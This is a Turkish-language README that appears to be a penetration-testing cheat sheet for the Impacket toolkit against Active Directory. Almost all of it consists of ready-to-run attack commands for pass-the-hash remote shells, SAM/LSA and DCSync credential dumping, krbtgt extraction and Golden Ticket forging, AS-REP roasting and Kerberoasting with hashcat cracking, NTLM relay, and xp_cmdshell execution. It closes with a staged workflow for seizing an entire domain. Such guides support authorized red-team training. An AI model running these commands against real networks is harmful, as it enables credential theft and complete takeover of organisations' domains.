# 🐍 Impacket - Python Active Directory Saldırı Paketi Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python Ağ Protokolleri Güvenlik Paketi
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 İçindekiler

- [Impacket Nedir?](#-impacket-nedir)
- [Kurulum](#-kurulum)
- [Uzaktan Komut Çalıştırma (Remote Execution)](#-uzaktan-komut-çalıştırma-remote-execution)
- [Kimlik Bilgisi Dökümü (Credential Dumping)](#-kimlik-bilgisi-dökümü-credential-dumping)
- [Kerberos Saldırıları](#-kerberos-saldırıları)
- [SMB Saldırıları ve Relay](#-smb-saldırıları-ve-relay)
- [MSSQL Saldırıları](#-mssql-saldırıları)
- [LDAP ve AD Sorguları](#-ldap-ve-ad-sorguları)
- [Hızlı Başvuru Tablosu ve İş Akışı](#-hızlı-başvuru-tablosu-ve-iş-akışı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Impacket Nedir?

**Impacket**, düşük seviyeli ağ protokolleriyle (SMB, MSRPC, NTLM, Kerberos, LDAP, MSSQL) programatik olarak çalışmayı sağlayan açık kaynaklı bir Python kütüphanesi ve araç setidir. Active Directory sızma testlerinin ve kırmızı takım (Red Team) operasyonlarının omurgasını oluşturur.

### Temel Araçlar

| Araç | Açıklama |
|------|----------|
| **psexec.py** | SMB ve servis oluşturma üzerinden tam SYSTEM kabuğu |
| **wmiexec.py** | WMI protokolü üzerinden sessiz komut çalıştırma |
| **smbexec.py** | Servis bırakmadan SMB üzerinden komut yürütme |
| **atexec.py** | Windows Görev Zamanlayıcı (Task Scheduler) ile komut çalıştırma |
| **secretsdump.py** | SAM, LSA ve Active Directory (DCSync) parola hash dökümü |
| **GetNPUsers.py** | AS-REP Roasting saldırısı ile bilet çekme |
| **GetUserSPNs.py** | Kerberoasting saldırısı ile SPN servis biletlerini alma |
| **ntlmrelayx.py** | NTLM kimlik doğrulama aktarımı (Relay) saldırıları |
| **smbclient.py** | Komut satırı SMB istemcisi |
| **mssqlclient.py** | MSSQL veritabanı istemcisi ve `xp_cmdshell` çalıştırma |

---

## 🚀 Kurulum

### Kali Linux

```bash
# Kali Linux üzerinde paketler standart olarak kuruludur:
impacket-psexec --help

# Python pip ile en güncel sürümü yükleme / güncelleme:
pip3 install impacket --upgrade
```

### GitHub Üzerinden Kurulum

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

---

## 💻 Uzaktan Komut Çalıştırma (Remote Execution)

### 1. `psexec.py` (En Yaygın Yöntem)
Hedef makinede geçici bir Windows servisi oluşturarak doğrudan `NT AUTHORITY\SYSTEM` yetkisinde etkileşimli kabuk sağlar.

```bash
# Parola ile bağlanma
impacket-psexec domain.local/kullanici:parola@10.10.10.10

# Pass-the-Hash (NTLM Hash kullanarak)
impacket-psexec domain.local/kullanici@10.10.10.10 -hashes :NTLMHASH

# Yerel yönetici (Local Administrator) ile
impacket-psexec administrator:parola@10.10.10.10

# Tek bir komut çalıştırıp çıkma
impacket-psexec domain.local/kullanici:parola@10.10.10.10 "whoami"
```

### 2. `wmiexec.py` (Daha Sessiz ve Gizli)
Yeni bir Windows servisi oluşturmaz, doğrudan WMI (Windows Management Instrumentation) ve DCOM üzerinden komut çalıştırır. Savunma sistemleri ve antivirüsler tarafından daha zor tespit edilir.

```bash
# Etkileşimli WMI kabuğu
impacket-wmiexec domain.local/kullanici:parola@10.10.10.10

# NTLM Hash ile
impacket-wmiexec domain.local/kullanici@10.10.10.10 -hashes :NTLMHASH

# Çıktı üretmeden arka planda sessiz komut çalıştırma
impacket-wmiexec domain.local/kullanici:parola@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### 3. `smbexec.py`
SMB üzerinde bir servis dosyası bırakmadan, komutları geçici dosyalar aracılığıyla yürüten alternatif bir yöntemdir.

```bash
impacket-smbexec domain.local/kullanici:parola@10.10.10.10
impacket-smbexec domain.local/kullanici@10.10.10.10 -hashes :NTLMHASH
```

### 4. `atexec.py`
Windows Görev Zamanlayıcı (Task Scheduler) servisini kullanarak komut çalıştırır ve çıktısını çeker.

```bash
impacket-atexec domain.local/kullanici:parola@10.10.10.10 "whoami"
```

---

## 🔓 Kimlik Bilgisi Dökümü (Credential Dumping)

### `secretsdump.py`
Uzak makinenin SAM veritabanı, LSA sırları veya etki alanı denetleyicisindeki tüm kullanıcı parolalarını (DCSync) çekmek için kullanılan en güçlü araçtır.

```bash
# Uzaktaki hedef makineden SAM ve LSA parolalarını dökme
impacket-secretsdump domain.local/admin:parola@10.10.10.10

# NTLM Hash kullanarak döküm alma
impacket-secretsdump domain.local/admin@10.10.10.10 -hashes :NTLMHASH

# Çıktıyı dosyaya kaydetme
impacket-secretsdump domain.local/admin:parola@10.10.10.10 -outputfile hashler
```

### DCSync Saldırısı (Tüm Etki Alanı Parolalarını Çekme)
Etki alanında Domain Admin veya DCSync yetkisine sahip bir hesapla tüm AD veritabanını Domain Controller'dan talep edin:

```bash
# Tüm AD kullanıcılarının NTLM hash'lerini dökme
impacket-secretsdump -just-dc domain.local/admin:parola@DC01.domain.local

# Yalnızca belirli bir kullanıcının hash'ini dökme (Ör. Administrator)
impacket-secretsdump -just-dc-user Administrator domain.local/admin:parola@DC01.domain.local

# Golden Ticket üretmek için KRBTGT hesabının hash'ini çekme
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:parola@DC01.domain.local
```

### Yerel Dosyalardan Çıkarma (Offline Dumping)
```bash
# Alınan NTDS.dit ve SYSTEM kayıt defteri dosyasından hash çıkarma
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# SAM ve SYSTEM dosyalarından yerel hash'leri dökme
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## 🎫 Kerberos Saldırıları

### AS-REP Roasting (`GetNPUsers.py`)
Active Directory'de `Do not require Kerberos preauthentication` (Kerberos ön kimlik doğrulaması gerektirmez) seçeneği işaretlenmiş kullanıcıların AS-REP biletlerini çekerek çevrimdışı kırma saldırısıdır:

```bash
# Parola bilmeden, kullanıcı listesindeki hesapları tara
impacket-GetNPUsers domain.local/ -usersfile kullanicilar.txt -no-pass

# Geçerli bir etki alanı kullanıcısıyla tüm etki alanını tara ve biletleri kaydet
impacket-GetNPUsers domain.local/kullanici:parola -request -outputfile asrep_hashleri.txt -format hashcat
```

### Kerberoasting (`GetUserSPNs.py`)
Hizmet Asıl Adı (SPN) tanımlanmış servis hesaplarının TGS biletlerini talep edip çevrimdışı kırarak servis parolalarını elde etme tekniğidir:

```bash
# SPN'e sahip hesapları listele
impacket-GetUserSPNs domain.local/kullanici:parola

# TGS biletlerini talep et ve Hashcat formatında kaydet
impacket-GetUserSPNs domain.local/kullanici:parola -request -outputfile kerberoast.txt
```

### Biletleri Hashcat / John the Ripper ile Kırma

```bash
# AS-REP Roast Hash'lerini Kırma (Hashcat Modu: 18200)
hashcat -m 18200 asrep_hashleri.txt rockyou.txt

# Kerberoast (TGS) Biletlerini Kırma (Hashcat Modu: 13100)
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### Bilet Talep Etme ve Sahte Bilet Üretme (Golden/Silver Ticket)

```bash
# Parola veya Hash ile TGT bileti talep etme (getTGT.py)
impacket-getTGT domain.local/kullanici -hashes :NTLMHASH
export KRB5CCNAME=kullanici.ccache

# Golden Ticket üretme (ticketer.py)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local Administrator

# Üretilen bileti kullanarak sisteme bağlanma
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@hedef.domain.local -k -no-pass
```

---

## 📁 SMB Saldırıları ve Relay

### `smbserver.py` (Dosya Aktarımı İçin Yerel Paylaşım Açma)
Saldırgan makinede hızlı bir SMB paylaşımı başlatarak hedef makineden dosya indirme veya kurbanın kimlik bilgilerini tetikleme:

```bash
# /tmp/paylasim dizinini ağa aç
impacket-smbserver paylasim /tmp/paylasim -smb2support

# Hedef Windows makineden erişim:
# copy \\SALDIRGAN_IP\paylasim\dosya.exe .
```

### `ntlmrelayx.py` (NTLM Kimlik Doğrulama Aktarımı)
Responder gibi araçlarla yönlendirilen NTLM el sıkışmalarını SMB imzalama kapalı olan başka makinelere aktarma:

```bash
# SMB imzalama zorunlu olmayan hedeflere aktar ve komut çalıştır:
impacket-ntlmrelayx -tf hedefler.txt -smb2support -c "whoami"

# Hedeflerin SAM veritabanını otomatik dök:
impacket-ntlmrelayx -tf hedefler.txt -smb2support --sam

# LDAP servisine aktararak yeni etki alanı kullanıcısı oluştur:
impacket-ntlmrelayx -t ldap://DC01.domain.local --escalate-user saldirgan
```

---

## 🗄️ MSSQL Saldırıları

```bash
# Windows kimlik doğrulamasıyla bağlanma
impacket-mssqlclient domain.local/kullanici:parola@10.10.10.10 -windows-auth

# xp_cmdshell ile komut çalıştırma (mssqlclient içinde)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

---

## 📂 LDAP ve AD Sorguları

```bash
# Tüm etki alanı kullanıcılarını listele
impacket-GetADUsers domain.local/kullanici:parola -all

# SID Brute-Force ile kullanıcı ve grupları numaralandır
impacket-lookupsid domain.local/kullanici:parola@10.10.10.10

# Güvensiz Kerberos temsil (delegation) yapılandırmalarını keşfet
impacket-findDelegation domain.local/kullanici:parola -dc-ip 10.10.10.10
```

---

## 📊 Hızlı Başvuru Tablosu ve İş Akışı

### Tipik Active Directory Saldırı Sıralaması

```bash
# 1. Aşama: Parola olmadan AS-REP Roasting denemesi
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# 2. Aşama: Biletleri Hashcat ile kır
hashcat -m 18200 asrep.txt rockyou.txt

# 3. Aşama: Elde edilen kullanıcı ile Kerberoasting yap
impacket-GetUserSPNs domain.local/kullanici:parola -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Aşama: Yönetici yetkili makinelere sız
impacket-wmiexec domain.local/admin:parola@10.10.10.10

# 5. Aşama: Domain Controller'a DCSync saldırısı yap ve tüm ağı ele geçir
impacket-secretsdump -just-dc domain.local/admin:parola@DC01.domain.local
```

---

## 📚 Kaynaklar

- [Impacket GitHub Deposu](https://github.com/fortra/impacket)
- [Impacket Örnek Betikleri](https://github.com/fortra/impacket/tree/master/examples)
- [BloodHound Kılavuzumuz](../../BloodHound/translations/README.tr.md)

---

<p align="center">
  <b>🐍 Active Directory Ağlarında Tam Hakimiyet!</b><br>
  <i>Impacket - Modern sızma testlerinin en keskin kılıcı</i>
</p>
